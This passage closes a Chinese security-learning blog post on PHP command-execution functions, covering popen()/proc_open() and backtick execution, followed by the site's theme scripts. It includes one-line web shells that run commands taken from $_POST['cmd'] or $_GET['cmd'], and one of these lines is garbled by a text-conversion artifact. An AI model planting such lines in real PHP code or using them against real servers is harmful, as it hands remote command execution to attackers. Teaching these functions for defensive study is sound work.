+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/70d65bb950c7ad115066ad7f00469ad0.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/0654972127b328675920146bd227e83a.png"></p>
+<h3 id="6-popen-proc-open"><a href="#6-popen-proc-open" class="headerlink" title="6- popen()/proc_open()"></a><strong>6- popen()/proc_open()</strong></h3><ul>
+<li><p>作用</p>
+<p>该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。</p>
+</li>
+</ul>
+<p><code>**linux: </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $handle = popen(&quot;/bin/ls&quot;,&quot;r&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>**</code></p>
+<p><strong>windows:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;&gt; 1.txt&quot;</span>;<span class="title function_ invoke__">popen</span>(<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>,<span class="string">&#x27;r&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/19a99f3a2f4f987d67e948b2afb6310a.png"></p>
+<p> <img src="https://i-blog.csdnimg.cn/blog_migrate/24835284786b7b5d83fa2981025816d2.png"><img src="https://i-blog.csdnimg.cn/blog_migrate/089044971b2d8ffae48603cbd8b35355.png"></p>
+<h3 id="7-反引号"><a href="#7-反引号" class="headerlink" title="7- 反引号 ``"></a><strong>7- 反引号 ``</strong></h3><ul>
+<li><p>作用</p>
+<p>[``]反引号里面的代码也会被当作OS命令来执行</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**&lt;?php echo \`whoami\`?&gt;**</span><br></pre></td></tr></table></figure>
+
+<p><strong>或者：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**&lt;?php cmd\=𝑐𝑚𝑑\=\_GET\[&#x27;cmd&#x27;\];print \`$cmd\`; ?&gt;**</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5141b1671a040db049171cb24159601e.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/e590a11b4978f1224322e27589043122.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b1ccd4a063dde87b81db17cb16cc4182.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/c9d7dbeaf826eaf4c1ab388affeef651.png"></p>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>License</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">Newer</div><a href="/2026/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/17/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Eleven-hacker</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1">Stellar 1.33.1</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">PHP命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">PHP常见代码执行函数和命令执行函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-text">代码执行函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-eval"><span class="toc-text">1- eval()</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E5%88%AB%E6%B3%A8%E6%84%8F%EF%BC%9Aphp%E4%B8%AD-%E6%98%AF%E5%B9%B2%E4%BB%80%E4%B9%88%E7%9A%84"><span class="toc-text">特别注意：php中@是干什么的</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-assert-%EF%BC%88%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E5%8A%A0%E4%B8%8A%E5%88%86%E5%8F%B7%E4%BD%9C%E4%B8%BA%E7%BB%93%E5%B0%BE%EF%BC%89"><span class="toc-text">2- assert()    --（最好不要加上分号作为结尾）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call-user-func"><span class="toc-text">3- call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-create-function"><span class="toc-text">4- create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-array-map"><span class="toc-text">5- array_map()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-call-user-func-array"><span class="toc-text">6- call_user_func_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-array-filter"><span class="toc-text">7- array_filter()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-uasort-%E5%87%BD%E6%95%B0"><span class="toc-text">8- uasort()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-preg-replace"><span class="toc-text">9- preg_replace()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-text">命令执行函数：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-system"><span class="toc-text">1- system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-passthru"><span class="toc-text">2-passthru()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-exec"><span class="toc-text">3- exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-pcntl-exec"><span class="toc-text">4- pcntl_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-shell-exec"><span class="toc-text">5- shell_exec()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-popen-proc-open"><span class="toc-text">6- popen()&#x2F;proc_open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%8F%8D%E5%BC%95%E5%8F%B7"><span class="toc-text">7- 反引号 &#96;&#96;</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `Just`,
+      min: `minutes ago`,
+      hour: `hours ago`,
+      day: `days ago`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `Switched to Light Mode`,
+      dark: `Switched to Dark Mode`,
+      auto: `Switched to Auto Mode`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
